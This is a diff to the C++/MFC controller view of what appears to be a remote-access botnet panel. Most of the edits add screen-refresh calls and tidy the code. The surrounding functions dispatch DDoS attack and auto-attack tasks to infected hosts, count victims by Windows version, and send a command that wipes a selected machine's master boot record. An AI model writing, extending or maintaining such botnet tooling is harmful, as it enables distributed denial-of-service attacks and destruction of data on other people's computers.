@@ -134,21 +134,8 @@ BEGIN_MESSAGE_MAP(CPcView, CListView)
 	ON_COMMAND(IDC_AQGL_RZ, OnAqglRz)
 	ON_COMMAND(IDC_AQGL_YP,OnAqglYp)
 	ON_COMMAND(IDM_SHOWMSG, OnShowmsg)
-	//DOSS
 	ON_COMMAND(IDM_DDOS, OnDdos)
-	//DOSS
-
-
-/*
-	ON_COMMAND(IDM_SHOW_MSG, OnShowMsg)
-	ON_COMMAND(IDM_OPEN_PORT, OnOpenPort)
-	ON_COMMAND(IDM_PROXY, OnProxy)
-	ON_COMMAND(IDM_PORT_MAPSET, OnPortMapset)
-	ON_COMMAND(IDM_PORT_MAPPING, OnPortMapping)
-	ON_COMMAND(IDM_ADD_USER, OnAddUser)
-	ON_COMMAND(IDM_KILLMBR, OnKillmbr)
-	ON_COMMAND(IDM_CLEAN_ALL, OnCleanAll)
-*/
+	//ON_WM_PAINT()
 	//}}AFX_MSG_MAP
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
@@ -361,6 +348,8 @@ void CPcView::OnSize(UINT nType, int cx, int cy)
 		return;
 	
 	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);
+
+	Invalidate();		//刷新
 }
 /*
 BOOL CPcView::DeleteIcon()
@@ -771,6 +760,7 @@ LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
     }
 	//************************************
+	Invalidate();		//刷新
 
 	return 0;
 }
@@ -779,46 +769,47 @@ void CPcView::Suanxinglianjxianshi(UINT str)
 {
 	CString strLogText;
 		
-		strLogText = m_pListCtrl->GetItemText( str, 4 );
-		strLogText.MakeUpper();
-		if ( strLogText.Find("NT") != -1 )
-		{
-			g_pNumDlg->NT--;
-			g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
-		}
-		if ( strLogText.Find("XP") != -1 )
-		{
-			g_pNumDlg->XP--;
-			g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
-		}
-		if ( strLogText.Find("Vista") != -1 )
-		{
-			g_pNumDlg->Vista--;
-			g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
-		}
-		if ( strLogText.Find("Win7") != -1 )
-		{
-			g_pNumDlg->Win7--;
-			g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
-		}
-		if ( strLogText.Find("2000") != -1 )
-		{
-			g_pNumDlg->Win2000--;
-			g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
-		}
-		if ( strLogText.Find("2003") != -1 )
-		{
-			g_pNumDlg->Win2003--;
-			g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
-		}
-		if ( strLogText.Find("2008") != -1 )
-		{
-			g_pNumDlg->Win2008--;
-			g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
-		}
+	strLogText = m_pListCtrl->GetItemText( str, 4 );
+	strLogText.MakeUpper();
+	if ( strLogText.Find("NT") != -1 )
+	{
+		g_pNumDlg->NT--;
+		g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
+	}
+	if ( strLogText.Find("XP") != -1 )
+	{
+		g_pNumDlg->XP--;
+		g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
+	}
+	if ( strLogText.Find("Vista") != -1 )
+	{
+		g_pNumDlg->Vista--;
+		g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
+	}
+	if ( strLogText.Find("Win7") != -1 )
+	{
+		g_pNumDlg->Win7--;
+		g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
+	}
+	if ( strLogText.Find("2000") != -1 )
+	{
+		g_pNumDlg->Win2000--;
+		g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
+	}
+	if ( strLogText.Find("2003") != -1 )
+	{
+		g_pNumDlg->Win2003--;
+		g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
+	}
+	if ( strLogText.Find("2008") != -1 )
+	{
+		g_pNumDlg->Win2008--;
+		g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
+	}
 		
-		m_pListCtrl->DeleteItem(str);	
+	m_pListCtrl->DeleteItem(str);	
 
+	Invalidate();		//刷新
 	
 //	g_pTabView->UpDateNumber();
 //	g_pFrame->ShowConnectionsNumber();
@@ -933,6 +924,9 @@ LRESULT CPcView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	// 更新当前连接总数
 	g_pTabView->UpDateNumber();
 	g_pFrame->ShowConnectionsNumber();
+
+	Invalidate();		//刷新
+
 	return 0;
 }
 
@@ -1039,6 +1033,7 @@ void CPcView::SortColumn(int iCol, bool bAsc)
 	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
 	//CXTSortClass csc(m_pListCtrl, m_nSortedCol);
 	//csc.Sort(m_bAscending, xtSortString);
+
 }
 
 BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
@@ -1114,6 +1109,8 @@ void CPcView::OnDisconnect()
 	
 	g_pTabView->UpDateNumber();
 	g_pFrame->ShowConnectionsNumber();
+
+	Invalidate();		//刷新
 }
 
 void CPcView::OnFilemanager() 
@@ -1516,6 +1513,8 @@ void CPcView::OnChangeGroup()
 		}
 	}
 
+	Invalidate();		//刷新
+
 	// 更新当前连接总数
 //	g_pTabView->UpDateNumber();
 //	g_pFrame->ShowConnectionsNumber();
@@ -1678,6 +1677,9 @@ WORD CPcView::SendDDostStopCommand(WORD iTaskID)
 			m_pListCtrl->SetItemText(i,9,"空闲");
 		}
 	}
+
+	Invalidate();		//刷新
+
 	return Count;
 }
 
@@ -1704,6 +1706,8 @@ VOID CPcView::SendAutoAttack(ClientContext *Context)
 	wsprintf(StrShow,"任务 %d",m_AutoTask);
 
 	m_pListCtrl->SetItemText(iCount-1,9,StrShow);
+
+	Invalidate();		//刷新
 
 	delete pData;
 }
@@ -1775,6 +1779,8 @@ WORD CPcView::SendDDosAttackCommand(LPATTACK m_Attack,INT HostNums,BOOL AutoAtta
 		m_AutoTask = iTaskID;
 		memcpy(&m_AutoAttackData,m_Attack,sizeof(ATTACK));
 	}
+
+	Invalidate();		//刷新
 
 	return Count;
 }
@@ -2102,3 +2108,12 @@ void CPcView::OnAqglYp()
 	BYTE	bToken = COMMAND_KILL_MBR;
 	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
 }
+
+//void CPcView::OnPaint() 
+//{
+//	CPaintDC dc(this); // device context for painting
+//	
+//	// TODO: Add your message handler code here
+//
+//	// Do not call CListView::OnPaint() for painting messages
+//}
